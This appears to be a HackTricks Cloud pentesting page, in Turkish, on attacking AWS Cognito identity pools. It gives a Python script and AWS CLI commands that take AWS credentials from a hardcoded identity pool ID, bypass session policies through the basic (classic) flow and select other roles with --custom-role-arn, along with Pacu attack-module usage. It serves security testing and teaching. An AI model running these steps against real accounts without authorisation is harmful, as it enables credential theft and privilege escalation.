# Cognito Kimlik Havuzları

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Temel Bilgiler

Kimlik havuzları, kullanıcılarınızın **geçici kimlik bilgileri edinmesini** sağlayarak önemli bir rol oynar. Bu kimlik bilgileri, Amazon S3 ve DynamoDB gibi çeşitli AWS hizmetlerine erişim için gereklidir. Kimlik havuzlarının dikkate değer bir özelliği, hem anonim misafir kullanıcıları hem de kullanıcı kimlik doğrulaması için çeşitli kimlik sağlayıcılarını desteklemesidir. Desteklenen kimlik sağlayıcıları şunları içerir:

- Amazon Cognito kullanıcı havuzları
- Facebook, Google, Amazon ile Giriş Yap ve Apple ile Giriş Yap gibi sosyal oturum açma seçenekleri
- OpenID Connect (OIDC) uyumlu sağlayıcılar
- SAML (Security Assertion Markup Language) kimlik sağlayıcıları
- Geliştirici doğrulanmış kimlikler
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Senkronizasyonu

Kimlik Havuzu oturumları oluşturmak için öncelikle bir **Kimlik Kimliği oluşturmanız** gerekmektedir. Bu Kimlik Kimliği, **kullanıcının oturumunun kimliğidir**. Bu kimlikler, 1MB'ye kadar anahtar-değer çiftlerini depolayabilen en fazla 20 veri kümesine sahip olabilir.

Bu, bir kullanıcının bilgilerini (her zaman aynı Kimlik Kimliğini kullanacak olan) saklamak için **faydalıdır**.

Ayrıca, **cognito-sync** hizmeti, bu bilgileri **yönetmeye ve senkronize etmeye** olanak tanır (veri kümelerinde, akışlarda bilgi gönderme ve SNS mesajlarında...).

### Pentesting için Araçlar

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS sömürü çerçevesi, artık bir hesaptaki tüm Cognito varlıklarının numaralandırılmasını otomatikleştiren ve zayıf yapılandırmaları işaretleyen "cognito\_\_enum" ve "cognito\_\_attack" modüllerini içermektedir, erişim kontrolü için kullanılan kullanıcı öznitelikleri vb., ayrıca değiştirilebilir özel özniteliklere dayalı kullanıcı oluşturmayı (MFA desteği de dahil olmak üzere) ve ayrıcalık yükseltmeyi otomatikleştirir, kullanılabilir kimlik havuzu kimlik bilgileri, id belgelerindeki rol alınabilir roller vb.

Modüllerin işlevlerinin açıklaması için [blog yazısının](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) 2. bölümüne bakın. Kurulum talimatları için ana [Pacu](https://github.com/RhinoSecurityLabs/pacu) sayfasına bakın.

#### Kullanım

Belirli bir kimlik havuzu ve kullanıcı havuzu istemcisi için kullanıcı oluşturma ve tüm ayrıcalık yükseltme vektörlerini denemek için örnek cognito\_\_attack kullanımı:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Örnek cognito\_\_enum kullanımı, mevcut AWS hesabında görülebilen tüm kullanıcı havuzlarını, kullanıcı havuzu istemcilerini, kimlik havuzlarını, kullanıcıları vb. toplamak için:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner), Cognito üzerinde farklı saldırıları uygulayan istenmeyen hesap oluşturma ve kimlik havuzu yükseltmesi de dahil olmak üzere farklı saldırıları uygulayan bir Python CLI aracıdır.

#### Kurulum
```bash
$ pip install cognito-scanner
```
#### Kullanım
```bash
$ cognito-scanner --help
```
Daha fazla bilgi için https://github.com/padok-team/cognito-scanner adresine bakın

## IAM Rollerine Erişim

### Kimlik Doğrulama Yapılmamış

Bir saldırganın bir Cognito uygulamasında kimlik doğrulama yapılmamış bir kullanıcı olarak **AWS kimlik bilgilerine erişmek** için bilmesi gereken tek şey **Kimlik Havuzu Kimliği**'dir ve bu **Kimlik Havuzu Kimliği** web/mobil **uygulamasına sert kodlanmış olmalıdır**. Bir Kimlik Havuzu Kimliği şu şekilde görünür: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (kaba kuvvet saldırısı yapılamaz).

{% hint style="success" %}
Varsayılan olarak oluşturulan **IAM Cognito kimlik doğrulama yapılmamış rolü** `Cognito_<Kimlik Havuzu adı>Unauth_Role` olarak adlandırılır
{% endhint %}

Eğer sert kodlanmış bir Kimlik Havuzu Kimliği bulursanız ve kimlik doğrulama yapılmamış kullanıcılara izin veriyorsa, AWS kimlik bilgilerine şu şekilde erişebilirsiniz:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ya da aşağıdaki **aws cli komutlarını** kullanabilirsiniz:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Varsayılan olarak kimlik doğrulama yapılmamış bir cognito **kullanıcısının bir politika aracılığıyla atansa bile hiçbir izni OLMAYACAKTIR**. Aşağıdaki bölümü kontrol edin.
{% endhint %}

### Gelişmiş ve Temel Kimlik Doğrulama Akışı

Önceki bölüm varsayılan gelişmiş kimlik doğrulama akışını takip etti. Bu akış, oluşturulan IAM rol oturumuna **kısıtlayıcı** bir [**oturum politikası**](../../aws-basic-information/#session-policies) ayarlar. Bu politika, oturumun yalnızca [**bu listedeki hizmetleri kullanmasına izin verecektir**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (rolün diğer hizmetlere erişimi olsa bile).

Ancak, **Kimlik havuzunun "Temel (Klasik) Akış" özelliği etkinse**, kullanıcı bu akışı kullanarak **kısıtlayıcı oturum politikasına sahip olmayan bir oturum** alabilecektir.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Bu **hata** ile karşılaşıyorsanız, **temel akış etkin değil (varsayılan)** demektir

`GetOpenIdToken işlemi çağrılırken (InvalidParameterException) bir hata oluştu: Temel (klasik) akış etkin değil, lütfen gelişmiş akışı kullanın.`
{% endhint %}

Bir dizi IAM kimlik bilgisine sahip olduğunuzda [hangi erişime sahip olduğunuzu](../../#whoami) kontrol etmeli ve [ayrıcalıkları yükseltmeye](../../aws-privilege-escalation/) çalışmalısınız.

### Doğrulanmış

{% hint style="info" %}
**Doğrulanmış kullanıcıların** muhtemelen **farklı izinler** verileceğini unutmayın, bu yüzden **uygulama içinde kaydolabilirseniz**, bunu deneyin ve yeni kimlik bilgilerini alın.
{% endhint %}

Ayrıca **doğrulanmış kullanıcılar için roller** de mevcut olabilir ve bunlar **Kimlik Havuzu'na erişebilir**.

Bunun için **kimlik sağlayıcıya** erişiminizin olması gerekebilir. Eğer bu bir **Cognito Kullanıcı Havuzu** ise, belki varsayılan davranışı istismar edip **yeni bir kullanıcı oluşturabilirsiniz**.

{% hint style="success" %}
Varsayılan olarak **IAM Cognito doğrulanmış rolü** `Cognito_<Kimlik Havuzu adı>Auth_Role` olarak adlandırılır.
{% endhint %}

Neyse ki, **aşağıdaki örnek** zaten bir **Cognito Kullanıcı Havuzu'na** giriş yaptığınızı varsayar (unutmayın, diğer türde kimlik sağlayıcılar da yapılandırılmış olabilir).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;kimlik_havuzu_id> \
--logins cognito-idp.&#x3C;bölge>.amazonaws.com/&#x3C;KULLANICI_HAVUZU_ID>=&#x3C;ID_TOKEN>

# Önceki komutun yanıtından identity_id'yi alın
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;kimlik_id> \
--logins cognito-idp.&#x3C;bölge>.amazonaws.com/&#x3C;KULLANICI_HAVUZU_ID>=&#x3C;ID_TOKEN>


# IdToken'da, Kullanıcı Havuzu Grupları nedeniyle bir kullanıcının erişimine sahip olduğu rolleri bulabilirsiniz
# Belirli bir role kimlik bilgileri almak için --custom-role-arn kullanın
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;kimlik_id> \
<strong>    --custom-role-arn &#x3C;rol_arn> \
</strong>    --logins cognito-idp.&#x3C;bölge>.amazonaws.com/&#x3C;KULLANICI_HAVUZU_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Kullanıcının giriş yaptığı **kimlik sağlayıcıya** bağlı olarak **farklı IAM rolleri yapılandırılabilir** veya hatta sadece **kullanıcıya** bağlı olarak (talepleri kullanarak). Bu nedenle, aynı veya farklı sağlayıcılardan farklı kullanıcılara erişiminiz varsa, hepsinin IAM rollerine giriş yapmak ve erişmek **değerli olabilir**.
{% endhint %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Destek HackTricks</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin**.
* **Hacking püf noktalarını paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR gönderin.

</details>
{% endhint %}
